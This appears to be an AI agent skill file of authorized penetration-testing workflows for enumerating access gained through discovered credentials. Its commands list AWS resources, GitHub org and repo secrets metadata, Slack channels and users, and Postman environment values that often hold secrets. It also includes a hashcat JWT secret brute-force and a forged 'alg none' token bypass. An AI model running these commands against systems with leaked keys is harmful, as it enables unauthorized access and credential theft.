---
name: post-discovery
description: "Post-credential enumeration workflows for validated live keys — AWS IAM enum, GitHub PAT scope/repo enum, Slack workspace enum, JWT triage, Postman PMAK workspace enum, Anthropic/OpenAI usage enum. Requires validator confirmation first."
version: 1.0.0
triggers:
  - post discovery workflow
  - JWT triage
  - AWS key triage
  - AWS IAM enum
  - GitHub PAT scope
  - Slack workspace enum
  - Postman PMAK workspace enum
  - Anthropic API key
  - OpenAI API key
  - post-credential workflow
  - validated credential
  - algorithm confusion
  - JWT none bypass
---

# Post-Discovery Enumeration Workflows

> Sub-skill of `offensive-osint`. Load `osint-methodology` for pipeline and triage context.
> Authorized targets only.

---

## BEHAVIORAL CONTRACT

**When triggered:** A validated-live credential requires post-credential enumeration — AWS IAM scope, GitHub PAT repos, Slack workspace, JWT triage, Postman workspace, or AI API key scope.

**Execute:**
1. Confirm the credential was validated by `secrets-and-dorks` §4 as `verified_live`.
2. Confirm Rules of Engagement explicitly authorize credential enumeration beyond liveness check.
3. If either prerequisite is missing: emit `validation_skipped_by_policy`, stop, document why.
4. Match the credential type to the provider-specific workflow (§1-8 below).
5. Execute every read-only probe in the matching workflow. Never create, modify, delete, or send.
6. Document all findings with scope, account_id, detectability, and checked_at UTC.

**Output:** Per-credential scope report using `osint-methodology` §3 finding schema — account_id, permissions discovered, accessible resources, privilege scope.

**Severity rules:** Per `analysis-and-reporting` §4 severity decision matrix. AWS root key = CRITICAL. Broad-scope PMAK = CRITICAL. GitHub PAT with repo write = HIGH.

**Gating rules:** Prerequisites 1-2 are hard gates. This skill is NOT read-only reconnaissance — it enumerates authenticated access. No workflow runs without both gates passing.

**Chain to:** Feed enumeration results back to `analysis-and-reporting` for severity scoring and attack-path hints. Feed to `osint-methodology` §14 for client deliverable generation.

---

## 1. AWS Access Key — IAM Enum

```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# Identity (already done as part of validation)
aws sts get-caller-identity

# IAM-user details (only if ARN was :user/)
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text)

# What can I actually do? (simulate — read-only)
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names s3:ListAllMyBuckets ec2:DescribeInstances iam:ListUsers \
                 secretsmanager:ListSecrets ssm:DescribeParameters \
                 lambda:ListFunctions rds:DescribeDBInstances

# Read-only service enumeration
aws s3 ls
aws ec2 describe-instances --output table --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value]'
aws secretsmanager list-secrets --query 'SecretList[*].Name'
aws ssm describe-parameters --query 'Parameters[*].Name'
aws lambda list-functions --query 'Functions[*].FunctionName'
aws rds describe-db-instances --query 'DBInstances[*].DBInstanceIdentifier'

# CloudTrail check — is logging on?
aws cloudtrail describe-trails

# Check MFA enforcement on the user
aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled'
aws iam list-mfa-devices --user-name <username>
```

---

## 2. GitHub PAT — Repo Enum

```bash
TOKEN="ghp_..."
H="Authorization: token $TOKEN"

# Scopes already captured from X-OAuth-Scopes header
curl -sk -m 10 -I -H "$H" https://api.github.com/user | grep -i 'X-OAuth-Scopes'

# All repos accessible (own + collaborator + org member)
curl -sk -m 10 -H "$H" "https://api.github.com/user/repos?affiliation=owner,collaborator,organization_member&per_page=100"

# Org memberships
curl -sk -m 10 -H "$H" "https://api.github.com/user/orgs"

# Per-org: members, repos, secrets (metadata-only — names not values)
ORG="<orgname>"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/members"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/repos?per_page=100"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/actions/secrets"   # requires admin:org

# Per-repo workflow secrets (metadata only)
REPO="<orgname/reponame>"
curl -sk -m 10 -H "$H" "https://api.github.com/repos/$REPO/actions/secrets"
```

---

## 3. Slack Token — Workspace Enum

```bash
TOKEN="xoxb-..."
H="Authorization: Bearer $TOKEN"

# Identity details
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.identity" | jq .

# What conversations can I see?
curl -sk -m 10 -H "$H" -X POST \
  "https://slack.com/api/conversations.list?types=public_channel,private_channel,mpim,im&limit=200" | \
  jq '.channels[] | {id, name, is_private}'

# Workspace info
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/team.info" | jq .

# User list (only if scope includes users:read)
curl -sk -m 10 -H "$H" -X POST \
  "https://slack.com/api/users.list?limit=100" | \
  jq '.members[] | {name, real_name, is_admin}'

# DO NOT: chat.postMessage, files.upload, conversations.invite, etc.
```

---

## 4. JWT — Full Triage Workflow

```bash
JWT="eyJhbGciOiJIUzI1NiI..."

# Decode header
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# Look for: alg (none = critical, HS256 = symmetric, RS256 = asymmetric)
# Look for: kid, jku, x5u (injection targets)

# Decode payload
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Look for: exp (expired = downgraded), sub, iss, aud
# Look for: roles, scopes, permissions (privilege markers)
# Look for: sensitive claims (email, employee ID, etc.)

# Algorithm-confusion test (RS→HS)
# If alg is RS256, try crafting HS256 signed with public key as secret
# Tools: jwt_tool, jwt-cracker

# Brute-force HS256 secret (if HS256 + short-secret suspicion)
hashcat -m 16500 "$JWT" /path/to/wordlist.txt

# Check `none` algorithm bypass
NEW_JWT=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
NEW_JWT="${NEW_JWT}.$(echo "$JWT" | cut -d. -f2)."
# Test against API
```

---

## 5. Postman PMAK — Workspace Enum

```bash
PMAK="PMAK-..."
H="X-Api-Key: $PMAK"

# /me already done (validation)
curl -sk -m 10 -H "$H" https://api.getpostman.com/me | jq '.user'

# Workspaces
curl -sk -m 10 -H "$H" https://api.getpostman.com/workspaces | jq '.workspaces[] | {id, name, type}'

# Per-workspace collections + environments
WS="<workspace-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.collections[]'
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.environments[]'

# Per-collection requests (where secrets often live)
COL="<collection-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/collections/$COL" | jq '.collection.item[]'
# Run secret catalog over the JSON

# Environments (often contain creds)
ENV="<environment-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/environments/$ENV" | \
  jq '.environment.values[] | {key, value}'
```

---

## 6. Anthropic API Key — Usage Enum

```bash
KEY="sk-ant-api03-..."
H="x-api-key: $KEY"
A="anthropic-version: 2023-06-01"

# Models accessible (already done as validation)
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/models | jq '.data[] | .id'

# Usage / quota (admin-scoped tokens only)
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/organizations/usage_report | jq .

# DO NOT: send actual completion requests against organization budget
```

---

## 7. OpenAI API Key — Usage Enum

```bash
KEY="sk-..."
H="Authorization: Bearer $KEY"

# Models (already done as validation)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/models | jq '.data | length'

# Org info (if key has org scope)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/organizations | jq .

# Files / fine-tunes (sometimes contain training data with PII)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/files | jq .
curl -sk -m 10 -H "$H" https://api.openai.com/v1/fine_tuning/jobs | jq .
```

---

## 8. Generic Key — Provenance Enum

1. Find the consuming domain (where in JS bundle did the key appear? what URL is the bundle served from?).
2. Check the API docs of the inferred service.
3. If the key matches a known regex (`secrets-and-dorks` §1), use vendor-specific scope check.
4. If unknown service, search GitHub: `gh search code "<prefix>" --type=code`.
5. Identify scope before validating; some keys are write-broad on first use.
